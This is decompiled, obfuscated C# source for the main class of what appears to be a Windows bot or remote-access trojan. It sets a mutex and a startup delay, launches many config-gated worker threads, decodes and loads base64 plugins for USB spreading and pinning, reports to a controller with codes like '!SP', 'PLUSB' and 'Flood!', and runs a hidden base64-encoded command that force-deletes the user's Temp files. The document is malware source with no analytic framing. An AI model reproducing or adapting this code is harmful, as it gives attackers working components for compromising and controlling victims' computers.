using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using A;
using Client;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;
using ns1;
using ns10;
using ns11;
using ns12;
using ns13;
using ns15;
using ns16;
using ns18;
using ns19;
using ns2;
using ns20;
using ns21;
using ns22;
using ns23;
using ns24;
using ns25;
using ns26;
using ns27;
using ns28;
using ns29;
using ns3;
using ns30;
using ns31;
using ns32;
using ns33;
using ns34;
using ns35;
using ns36;
using ns37;
using ns38;
using ns39;
using ns4;
using ns5;
using ns6;
using ns7;
using ns8;
using ns9;

namespace ns17;

public class GClass17
{
	public static object object_0 = GClass20.string_4;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_0578: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Expected O, but got Unknown
		try
		{
			string text = "";
			Random random = new Random();
			int num = 10;
			do
			{
				text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
				num++;
			}
			while (num <= 60);
			for (int num2 = GClass20.int_1; num2 != 0; num2--)
			{
				Thread.Sleep(1000);
			}
			bool createdNew = false;
			GClass20.mutex_0 = new Mutex(initiallyOwned: true, GClass15.smethod_5(), out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			if (GClass20.bool_8)
			{
				GClass4.smethod_0();
			}
			if (GClass20.bool_9)
			{
				GClass5.smethod_0();
			}
			if (GClass20.bool_10)
			{
				GClass6.smethod_0();
			}
			if (GClass20.bool_11)
			{
				GClass7.smethod_0();
			}
			if (GClass20.bool_12)
			{
				GClass3.smethod_0();
			}
			if (GClass20.bool_13)
			{
				GClass8.smethod_0();
			}
			if (GClass20.bool_14)
			{
				GClass2.smethod_0();
			}
			if (GClass20.bool_15)
			{
				GClass1.smethod_0();
			}
			if (GClass20.bool_3)
			{
				GClass19.smethod_0();
			}
			if (GClass20.bool_4)
			{
				GClass19.smethod_1();
			}
			if (GClass20.bool_5)
			{
				GClass19.smethod_2();
			}
			if (GClass20.bool_6)
			{
				GClass19.smethod_3();
			}
			GClass16.smethod_0();
			GClass21.thread_0.Start();
			if (GClass20.bool_0)
			{
				Thread thread = new Thread(a);
				thread.Start();
			}
			if (GClass20.bool_1)
			{
				Thread thread2 = new Thread(B);
				thread2.Start();
			}
			Thread thread3 = new Thread(A);
			thread3.Start();
			Thread thread4 = new Thread(A);
			thread4.Start();
			Thread thread5 = new Thread(A);
			thread5.Start();
			if (GClass20.bool_19)
			{
				GClass10.smethod_0();
			}
			if (GClass20.bool_2)
			{
				C_DRPB.smethod_0();
			}
			if (GClass20.bool_7)
			{
				GClass0.smethod_0();
			}
			Thread thread6 = new Thread(GClass13.smethod_0);
			thread6.Start();
			Thread thread7 = new Thread(GClass22.smethod_0);
			thread7.Start();
			Thread thread8 = new Thread(GClass9.smethod_0);
			thread8.Start();
			if (GClass20.string_14.Length > 25)
			{
				Thread thread9 = new Thread(GClass26.smethod_0);
				thread9.SetApartmentState(ApartmentState.STA);
				thread9.Start();
			}
			if (GClass20.string_15.Length > 25)
			{
				Thread thread10 = new Thread(GClass34.smethod_0);
				thread10.SetApartmentState(ApartmentState.STA);
				thread10.Start();
			}
			if (GClass20.string_16.Length > 92)
			{
				Thread thread11 = new Thread(GClass35.smethod_0);
				thread11.SetApartmentState(ApartmentState.STA);
				thread11.Start();
			}
			if (GClass20.string_17.Length > 39)
			{
				Thread thread12 = new Thread(GClass32.smethod_0);
				thread12.SetApartmentState(ApartmentState.STA);
				thread12.Start();
			}
			if (GClass20.string_18.Length > 32)
			{
				Thread thread13 = new Thread(GClass39.smethod_0);
				thread13.SetApartmentState(ApartmentState.STA);
				thread13.Start();
			}
			if (GClass20.string_19.Length > 89)
			{
				Thread thread14 = new Thread(GClass23.smethod_0);
				thread14.SetApartmentState(ApartmentState.STA);
				thread14.Start();
			}
			if (GClass20.string_20.Length > 29)
			{
				Thread thread15 = new Thread(GClass29.smethod_0);
				thread15.SetApartmentState(ApartmentState.STA);
				thread15.Start();
			}
			if (GClass20.string_21.Length > 39)
			{
				Thread thread16 = new Thread(GClass25.smethod_0);
				thread16.SetApartmentState(ApartmentState.STA);
				thread16.Start();
			}
			if (GClass20.string_22.Length > 33)
			{
				Thread thread17 = new Thread(GClass31.smethod_0);
				thread17.SetApartmentState(ApartmentState.STA);
				thread17.Start();
			}
			if (GClass20.string_23.Length > 33)
			{
				Thread thread18 = new Thread(GClass36.smethod_0);
				thread18.SetApartmentState(ApartmentState.STA);
				thread18.Start();
			}
			if (GClass20.string_24.Length > 32)
			{
				Thread thread19 = new Thread(GClass27.smethod_0);
				thread19.SetApartmentState(ApartmentState.STA);
				thread19.Start();
			}
			if (GClass20.string_25.Length > 25)
			{
				Thread thread20 = new Thread(GClass30.smethod_0);
				thread20.SetApartmentState(ApartmentState.STA);
				thread20.Start();
			}
			if (GClass20.string_12.Length > 10)
			{
				Thread thread21 = new Thread(GClass38.smethod_0);
				thread21.SetApartmentState(ApartmentState.STA);
				thread21.Start();
			}
			if (GClass20.string_11.Length > 11)
			{
				Thread thread22 = new Thread(GClass37.smethod_0);
				thread22.SetApartmentState(ApartmentState.STA);
				thread22.Start();
			}
			if (GClass20.string_13.Length > 14)
			{
				Thread thread23 = new Thread(GClass24.smethod_0);
				thread23.SetApartmentState(ApartmentState.STA);
				thread23.Start();
			}
			if (GClass20.string_26.Length > 15)
			{
				Thread thread24 = new Thread(GClass28.smethod_0);
				thread24.SetApartmentState(ApartmentState.STA);
				thread24.Start();
			}
			if (GClass20.string_27.Length > 31)
			{
				Thread thread25 = new Thread(GClass33.smethod_0);
				thread25.SetApartmentState(ApartmentState.STA);
				thread25.Start();
			}
			GClass11.smethod_0();
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(C.A));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("coredll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void SystemIdleTimerReset();

	private static void A()
	{
		Thread.Sleep(5000);
		string text = Conversions.ToString(GClass15.smethod_7());
		string text2 = "...";
		string text3 = Conversions.ToString(GClass15.smethod_11());
		GClass18.smethod_0();
		while (true)
		{
			int num = 1;
			if (!GClass21.bool_0)
			{
				Thread.Sleep(5000);
				continue;
			}
			Thread.Sleep(3000);
			try
			{
				if (GClass20.bool_0 && Operators.CompareString(text, C.b("USB").ToString(), false) != 0)
				{
					text = C.b("USB");
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!SP", object_0), (object)text)));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text2, GClass15.smethod_10(), false) != 0)
				{
					text2 = GClass15.smethod_10();
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!X", object_0), (object)text2)));
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text3, C.b("Flood").ToString(), false) != 0)
				{
					text3 = C.b("Flood");
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"MSG", object_0), (object)"Flood! "), (object)text3)));
					text3 = "";
					C.a("Flood", "");
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void a()
	{
		try
		{
			if (Operators.CompareString(C.b("_USB"), (string)null, false) == 0)
			{
				while (!GClass21.bool_0)
				{
					Thread.Sleep(5000);
				}
				Thread.Sleep(9000);
				GClass21.smethod_3("PLUSB");
			}
			else
			{
				byte[] byte_ = Convert.FromBase64String(C.b("_USB"));
				bool bool_ = false;
				GClass12.smethod_1(C.A(byte_, ref bool_));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"_USB Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	private static void B()
	{
		try
		{
			if (Operators.CompareString(C.b("_PIN"), (string)null, false) == 0)
			{
				while (!GClass21.bool_0)
				{
					Thread.Sleep(5000);
				}
				Thread.Sleep(11000);
				GClass21.smethod_3("PLPIN");
			}
			else
			{
				byte[] byte_ = Convert.FromBase64String(C.b("_PIN"));
				bool bool_ = false;
				GClass12.smethod_1(C.A(byte_, ref bool_));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"_PIN Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_0()
	{
		try
		{
			Thread.Sleep(500);
			Interaction.Shell(C.A(Convert.FromBase64String("Y21kIC9jIGNhbGwgREVMIC9GIC9TIC9RIEM6XFVzZXJzXCVVc2VybmFtZSVcQXBwRGF0YVxMb2NhbFxUZW1wXCouKg==")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] smethod_1()
	{
		ResourceManager resourceManager = new ResourceManager("2020", Assembly.GetEntryAssembly());
		return (byte[])resourceManager.GetObject("%libraryName%");
	}
}
